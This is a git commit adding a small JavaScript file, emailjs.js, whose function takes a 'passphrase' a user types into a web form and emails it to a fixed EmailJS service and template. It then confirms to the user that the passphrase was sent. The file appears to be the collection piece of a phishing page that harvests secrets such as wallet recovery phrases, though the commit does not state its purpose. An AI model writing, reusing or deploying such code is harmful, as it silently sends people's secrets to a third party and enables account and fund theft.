dfa1afa2514b5db8040248ed47daafad3cbf6c25
Sonkiban32 <Sonkiban32@gmail.com>
2025-03-05 15:49:39 +0100

    Add files via upload

---
+++ emailjs.js
@@ -0,0 +1,19 @@
+
+function emailSend(event) {
+  event.preventDefault();  // Prevent the form from submitting normally
+
+  // Get the message (passphrase) from the textarea
+  const message = document.getElementById("message").value;
+
+  // Send the email using EmailJS
+  emailjs.send("service_kxevbjf", "template_qwxwoqn", {
+    message: message
+  })
+    .then(function (response) {
+      console.log("Success:", response);
+      alert("Your passphrase has been sent successfully!");
+    }, function (error) {
+      console.log("Error:", error);
+      alert("There was an error sending your passphrase. Please try again.");
+    });
+}
